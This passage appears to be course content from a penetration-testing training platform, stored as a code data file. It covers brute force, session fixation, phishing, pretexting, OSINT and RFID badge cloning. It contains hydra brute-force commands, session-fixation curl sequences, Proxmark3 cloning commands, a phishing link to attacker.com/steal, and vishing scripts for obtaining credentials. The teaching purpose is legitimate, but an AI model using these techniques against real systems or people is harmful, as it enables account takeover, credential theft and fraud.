# Password spraying (one password, many users)
hydra -L users.txt -p "Password123!" http-post-form \
      "target.com/login:username=^USER^&password=^PASS^:Invalid"
\`\`\`

**Brute force with Burp Suite Intruder:**
1. Capture the login request in Burp Proxy
2. Right-click → Send to Intruder
3. In Intruder → Positions, mark the password field with §
4. In Intruder → Payloads, load a wordlist
5. Start the attack
6. Sort by response length — a different length usually indicates success

**What to look for in the application's response:**
- Does it lock out after N failed attempts? (good security control)
- Does it throttle (slow down) after failures? (good)
- Does it do nothing? (vulnerable to brute force)
- Does it reveal whether the username exists? (username enumeration)

Attempt a brute force on the demo login. Document the application's response to repeated failures.`,
              image: null,
            },
            {
              title: 'Session Token Analysis',
              instruction:
                `Session tokens are the keys to authenticated sessions. Weak tokens can be predicted or forged.

**Analysing session tokens:**
\`\`\`bash
# Log in multiple times and collect session tokens
curl -v -c - -d "username=admin&password=test" http://target.com/login 2>&1 | grep "Set-Cookie"

# Decode a base64 token
echo "dXNlcjoxMjM0NTY=" | base64 -d
# Output: user:123456

# Decode a JWT token (JSON Web Token)
# JWT format: header.payload.signature (base64url encoded)
echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
# Output: {"user":"admin"}
\`\`\`

**What makes a session token weak:**
- **Predictable** — sequential numbers, timestamps, or simple patterns
- **Short** — fewer than 128 bits of entropy
- **Not invalidated on logout** — the token remains valid after the user logs out
- **Not rotated after privilege change** — the same token is used before and after login

**Testing token invalidation:**
\`\`\`bash
# 1. Log in and capture the session token
# 2. Log out
# 3. Try to use the old token to access a protected page
curl -b "session=old_token_here" http://target.com/dashboard

# If you get a 200 response, the token was not invalidated on logout
\`\`\`

Log in to the demo application. Collect 5 session tokens from 5 separate logins. Are they random? Are they predictable? Log out and test whether the token is still valid.`,
              image: null,
            },
            {
              title: 'Session Fixation and Hijacking',
              instruction:
                `Session fixation forces a victim to use a known session ID. Session hijacking steals an existing session token.

**Session fixation attack:**
\`\`\`bash
# 1. Attacker gets a valid (unauthenticated) session token from the server
curl http://target.com/  # Server sets: Set-Cookie: session=KNOWN_TOKEN

# 2. Attacker tricks the victim into using this token
# (via a link: http://target.com/login?session=KNOWN_TOKEN)

# 3. Victim logs in — if the server does not rotate the token on login,
#    the attacker's known token is now authenticated

# 4. Attacker uses the known token to access the victim's account
curl -b "session=KNOWN_TOKEN" http://target.com/dashboard
\`\`\`

**Testing for session fixation:**
\`\`\`bash
# 1. Get a session token before logging in
BEFORE_LOGIN=$(curl -c - http://target.com/ 2>&1 | grep session | awk '{print $7}')

# 2. Log in
curl -b "session=$BEFORE_LOGIN" -d "username=admin&password=test" http://target.com/login

# 3. Check if the token changed after login
AFTER_LOGIN=$(curl -c - -b "session=$BEFORE_LOGIN" http://target.com/dashboard 2>&1 | grep session | awk '{print $7}')

echo "Before: $BEFORE_LOGIN"
echo "After: $AFTER_LOGIN"
# If they are the same, the application is vulnerable to session fixation
\`\`\`

**Session hijacking via XSS:**
If you have XSS, you can steal the session cookie and use it to impersonate the victim — this is why HttpOnly cookies are important.

Test the demo application for session fixation. Document whether the session token changes after login.`,
              image: null,
            },
            {
              title: 'Authentication Findings Report',
              instruction:
                `Write a complete authentication assessment report for the demo application.

**Structure your report as follows:**

**Executive Summary:** One paragraph describing the overall authentication security posture.

**Finding 1 — No Account Lockout:**
\`\`\`bash
Title: No Account Lockout on Login Endpoint
Severity: Medium
Evidence: 100 failed login attempts were made without any lockout or throttling.
          Command used: hydra -l admin -P wordlist.txt http-post-form "..."
Impact: An attacker can brute force user passwords without restriction.
Remediation: Implement account lockout after 5-10 failed attempts.
             Implement CAPTCHA or rate limiting on the login endpoint.
\`\`\`

**Finding 2 — Session Token Not Invalidated on Logout:**
\`\`\`bash
Title: Session Token Remains Valid After Logout
Severity: High
Evidence: After logging out, the session token [TOKEN] was used to access
          /dashboard and received a 200 response.
Impact: If a session token is stolen (via XSS, network interception, or
        log exposure), it remains valid indefinitely after the user logs out.
Remediation: Invalidate session tokens server-side on logout.
             Implement session expiry (e.g. 30 minutes of inactivity).
\`\`\`

Write findings for every authentication weakness you discovered. Be specific — include the exact evidence, the HTTP requests and responses, and concrete remediation steps.`,
              image: null,
            },
          ],
        },
      ],
    },

    // ── PHASE 5: SOCIAL ENGINEERING (moduleId: 5, 3 rooms) ──────────────────
    {
      id: 'phase5',
      title: 'Social Engineering',
      codename: 'PHASE 5',
      rooms: [
        {
          id: 'room1',
          title: 'Phishing & Pretexting',
          overview:
            'The most sophisticated technical defences can be bypassed by a well-crafted email. This room teaches you how social engineering attacks are constructed, why they work psychologically, and how to execute them in authorised engagements.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'The Psychology of Social Engineering',
              instruction:
                `Social engineering exploits human psychology, not technical vulnerabilities. Understanding the psychological principles makes you both a better attacker and a better defender.

**The six principles of influence (Robert Cialdini):**

**1. Authority** — People comply with requests from perceived authority figures. Example: "This is IT support. I need your password to fix a critical security issue."

**2. Urgency/Scarcity** — Time pressure reduces critical thinking. Example: "Your account will be suspended in 24 hours unless you verify your details immediately."

**3. Social Proof** — People follow what others do. Example: "Your colleagues have already completed this security training. You are the only one who has not."

**4. Liking** — People comply with requests from people they like or trust. Example: impersonating a colleague or a well-known brand.

**5. Reciprocity** — People feel obligated to return favours. Example: offering something of value before making a request.

**6. Commitment/Consistency** — People act consistently with their prior commitments. Example: getting a small agreement first, then escalating the request.

Find three real phishing emails online (search for "phishing email examples"). For each one, identify which psychological principles are being used and explain specifically how each principle is applied in the email.`,
              image: null,
            },
            {
              title: 'Anatomy of a Phishing Email',
              instruction:
                `A professional phishing email has several technical and psychological components. Understanding each one helps you both craft and detect phishing attacks.

**Technical components:**

**Sender spoofing:**
\`\`\`bash
# Email headers can be forged. The From: field is not verified by default.
# A spoofed email might show:
From: security@paypal.com
# But the actual sending server is:
Received: from mail.attacker.com

# Check the full email headers to see the actual sending server
# In Gmail: More → Show original
# In Outlook: File → Properties → Internet headers
\`\`\`

**Lookalike domains:**
\`\`\`bash
# Legitimate: paypal.com
# Lookalike: paypa1.com (1 instead of l)
# Lookalike: paypal-security.com
# Lookalike: secure-paypal.com
# Lookalike: paypal.com.attacker.com (subdomain of attacker.com)

# Register a lookalike domain for a simulated engagement
# Tools: dnstwist (generates typosquatting variations)
dnstwist paypal.com
\`\`\`

**Malicious links:**
\`\`\`bash
# The displayed text and the actual URL are different in HTML:
<a href="http://attacker.com/steal">http://paypal.com/verify</a>

# URL shorteners hide the destination:
http://bit.ly/3xK9mP2  # Could go anywhere

# Hover over links before clicking to see the real destination
\`\`\`

Construct a phishing email template for a simulated engagement. Include: a convincing pretext, a spoofed sender, urgency language, and a call to action. Document which psychological principles you used and why.`,
              image: null,
            },
            {
              title: 'Pretexting and Vishing',
              instruction:
                `Pretexting is creating a believable false scenario to manipulate a target. Vishing (voice phishing) uses phone calls instead of email.

**Building a pretext:**

A good pretext has four elements:
1. **Role** — who you are pretending to be (IT support, auditor, new employee, vendor)
2. **Reason** — why you are contacting the target (system upgrade, security audit, onboarding)
3. **Request** — what you want (credentials, access, information, physical access)
4. **Urgency** — why it needs to happen now

**Example pretext scenarios:**

Scenario 1 — IT Support:
"Hi, this is James from the IT helpdesk. We are rolling out a security update to all workstations today. I need to remote into your machine to complete the installation. Can you give me your username so I can verify your account?"

Scenario 2 — New Employee:
"Hi, I just started in the finance department this week. I am trying to access the shared drive but I am getting an error. My manager is in a meeting and I need to submit a report in the next hour. Could you help me reset my access?"

Scenario 3 — Vendor:
"Hello, I am calling from [software vendor]. We have detected unusual activity on your account and need to verify your identity. Can you confirm your username and the last four digits of your employee ID?"

**Why these work:** Each scenario uses authority (IT, vendor), urgency (deadline, security issue), and a plausible reason that the target cannot easily verify.

Write three original pretext scenarios for a simulated engagement against a fictional company. For each one, identify the psychological triggers used and explain why the target would comply.`,
              image: null,
            },
          ],
        },
        {
          id: 'room2',
          title: 'OSINT Fundamentals',
          overview:
            'Open source intelligence (OSINT) is the collection of information from publicly available sources. It is the first step in any engagement — you need to know your target before you touch anything.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'Google Dorking',
              instruction:
                `Google dorking uses advanced search operators to find information that is publicly accessible but not easily discovered through normal searches.

**Essential Google dork operators:**
\`\`\`bash
# Find all pages on a specific domain
site:target.com

# Find specific file types
site:target.com filetype:pdf
site:target.com filetype:xlsx
site:target.com filetype:docx

# Find admin pages
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:dashboard

# Find configuration files
site:target.com filetype:conf
site:target.com filetype:env
site:target.com filetype:xml

# Find pages with specific text
site:target.com "internal use only"
site:target.com "confidential"

# Find exposed directories
site:target.com intitle:"index of"

# Find login pages
site:target.com intitle:"login" OR intitle:"sign in"

# Combine operators
site:target.com filetype:pdf "confidential" -inurl:press
\`\`\`

**Google Hacking Database (GHDB):** exploit-db.com/google-hacking-database contains thousands of dorks for finding specific types of exposed information.

Run these dorks against a target organisation (use a company you have permission to research, or use a deliberately vulnerable target). Document every result. For each finding, explain what information is exposed and how an attacker could use it.`,
              image: null,
            },
            {
              title: 'Automated OSINT Tools',
              instruction:
                `Several tools automate the collection of OSINT data, saving time and ensuring comprehensive coverage.

**theHarvester — email and subdomain enumeration:**
\`\`\`bash
# Gather emails and subdomains from multiple sources
theHarvester -d target.com -b google,bing,linkedin,twitter

# Use a specific source
theHarvester -d target.com -b google

# Save results to a file
theHarvester -d target.com -b all -f results.html
\`\`\`

**Shodan — internet-connected device search engine:**
\`\`\`bash
# Search for devices belonging to an organisation
shodan search "org:Target Company"

# Find specific services
shodan search "hostname:target.com port:22"
shodan search "hostname:target.com http.title:admin"

# Get information about a specific IP
shodan host 192.168.1.1
\`\`\`

**Maltego — visual link analysis:**
Maltego maps relationships between entities (domains, IPs, email addresses, people). It is used for building a comprehensive picture of a target's infrastructure and personnel.

**Recon-ng — modular reconnaissance framework:**
\`\`\`bash
# Start recon-ng
recon-ng

# Load a module
[recon-ng] > marketplace install recon/domains-hosts/hackertarget
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE target.com
[recon-ng] > run
\`\`\`

Run theHarvester against a target domain. Document every email address and subdomain found. For each email address, what does it reveal about the organisation's naming convention? How could this be used in a phishing attack?`,
              image: null,
            },
            {
              title: 'Social Media and LinkedIn OSINT',
              instruction:
                `Social media is a goldmine for OSINT. Employees post information that reveals organisational structure, technology stack, internal processes, and personal details that can be used in social engineering.

**What to look for on LinkedIn:**
\`\`\`bash
# Search for employees of a target organisation
# site:linkedin.com "Target Company" "engineer"
# site:linkedin.com "Target Company" "IT"
# site:linkedin.com "Target Company" "security"

# From employee profiles, collect:
# - Full names (for email address construction)
# - Job titles (for pretexting)
# - Technologies mentioned in skills/experience
# - Internal project names
# - Reporting structure (who reports to whom)
\`\`\`

**Constructing email addresses from names:**
\`\`\`bash
# Common email formats:
# firstname.lastname@company.com
# f.lastname@company.com
# firstname@company.com
# flastname@company.com

# Verify email format using Hunter.io or similar
# Or find one confirmed email and apply the pattern to other names

# Verify if an email address exists (without sending an email)
# SMTP VRFY command (often disabled):
nc mail.target.com 25
VRFY john.smith@target.com
\`\`\`

**Job postings reveal technology stack:**
\`\`\`bash
# A job posting for "Senior AWS Engineer with Kubernetes experience"
# reveals: cloud provider (AWS), container orchestration (Kubernetes)

# A posting for "React/Node.js developer"
# reveals: frontend (React), backend (Node.js)

# This information helps you target the right vulnerabilities
\`\`\`

Search LinkedIn for employees of a target organisation. Build a list of at least 10 employees with their names, titles, and any technology information. Construct likely email addresses for each. Document what you could use in a social engineering attack.`,
              image: null,
            },
          ],
        },
        {
          id: 'room3',
          title: 'Physical Security',
          overview:
            'Physical access often bypasses all digital controls. A locked server room is useless if someone can tailgate through the door. This room covers physical intrusion techniques and how to assess physical security in an authorised engagement.',
          estimatedMinutes: 20,
          steps: [
            {
              title: 'Tailgating and Physical Intrusion',
              instruction:
                `Physical security testing (also called physical penetration testing) involves attempting to gain unauthorised physical access to a facility. It requires explicit written authorisation — always carry your authorisation letter.

**Tailgating** — following an authorised person through a secured door without using your own credentials:
- Wait near a secured entrance for an employee to badge in
- Follow closely behind them, appearing to be with them
- Carry something (boxes, coffee, laptop bag) to appear legitimate and to make it awkward for the employee to challenge you

**Piggybacking** — the same as tailgating, but the authorised person is aware and holds the door (social engineering the employee)

**Physical controls and how they are bypassed:**

| Control | Bypass |
|---------|--------|
| Badge reader | Tailgating, badge cloning |
| PIN pad | Shoulder surfing, thermal imaging |
| Security guard | Pretexting, distraction |
| Locked door | Lock picking, under-door tools |
| Visitor sign-in | Fake ID, social engineering |

**What to look for during a physical assessment:**
\`\`\`bash
# Document every physical control:
# - Badge readers (what type? proximity, smart card, biometric?)
# - Camera coverage (are there blind spots?)
# - Guard presence and patrol patterns
# - Tailgating opportunities (busy entrances, loading docks, smoking areas)
# - Unlocked server rooms or network closets
# - Unattended workstations (are screens locked?)
# - Sensitive documents left on desks or in bins
\`\`\`

Write a physical security assessment checklist based on this information. For each control, describe how you would test it in an authorised engagement.`,
              image: null,
            },
            {
              title: 'RFID and Badge Cloning',
              instruction:
                `Most corporate access control systems use RFID (Radio Frequency Identification) or NFC (Near Field Communication) badges. These can be cloned if the attacker can get close enough to the badge.

**How RFID badge cloning works:**

1. The attacker carries a concealed RFID reader (e.g. Proxmark3)
2. The reader is brought within a few centimetres of the target's badge
3. The badge data is read and stored
4. The data is written to a blank card
5. The cloned card is used to access the facility

**Common RFID frequencies:**
- **125 kHz (LF)** — older, less secure systems (HID Prox, EM4100). Easy to clone.
- **13.56 MHz (HF)** — newer systems (HID iCLASS, MIFARE). More secure but still vulnerable.

**Tools used:**
\`\`\`bash
# Proxmark3 — the industry standard RFID research tool
# Read a 125kHz card
pm3 -c "lf hid read"

# Clone to a blank card
pm3 -c "lf hid clone --r [card_data]"

# Read a 13.56MHz card
pm3 -c "hf mf reader"
\`\`\`

**Legal considerations:** RFID cloning without authorisation is illegal. In an authorised engagement, you must have explicit written permission to test badge cloning. The authorisation letter must be carried at all times.

Research the Proxmark3 tool and the types of RFID cards it can read and clone. Write a summary of: what information is stored on a typical HID Prox card, how it is read, and what security controls prevent cloning.`,
              image: null,
            },
            {
              title: 'Dumpster Diving and Shoulder Surfing',
              instruction:
                `Two of the simplest physical attack techniques require no tools — just observation and access to discarded materials.

**Dumpster diving** — searching through discarded materials for sensitive information:

What attackers look for:
\`\`\`bash
# Documents:
# - Printed emails with internal information
# - Org charts and employee directories
# - Network diagrams
# - Old passwords written on paper
# - Financial documents
# - Customer data

# Hardware:
# - Old hard drives (often not wiped)
# - USB drives
# - Printed circuit boards with model numbers
# - Old phones and laptops
\`\`\`

**Shoulder surfing** — observing someone's screen or keyboard to capture sensitive information:
- Sitting behind someone in a coffee shop or on public transport
- Using a camera or binoculars from a distance
- Observing PIN entry at ATMs or door keypads

**Defences:**
\`\`\`bash
# Against dumpster diving:
# - Cross-cut shredding of all documents (strip shredding is insufficient)
# - Secure disposal of hardware (NIST 800-88 guidelines for media sanitisation)
# - Clear desk policy

# Against shoulder surfing:
# - Privacy screens on laptops
# - Screen lock when stepping away (Win+L on Windows, Ctrl+Cmd+Q on Mac)
# - Awareness of surroundings in public spaces
# - Keyboard covers for PIN entry
\`\`\`

**Thermal imaging attacks on PIN pads:** After someone enters a PIN, the keys they pressed retain heat. A thermal camera can reveal the PIN within seconds of entry. This is why some high-security PIN pads use randomised key layouts.

Write a physical security report section covering dumpster diving and shoulder surfing risks. Include: what information could be obtained, the likelihood of each attack, and specific remediation recommendations.`,
              image: null,
            },
          ],
        },
      ],
    },

  ],
};
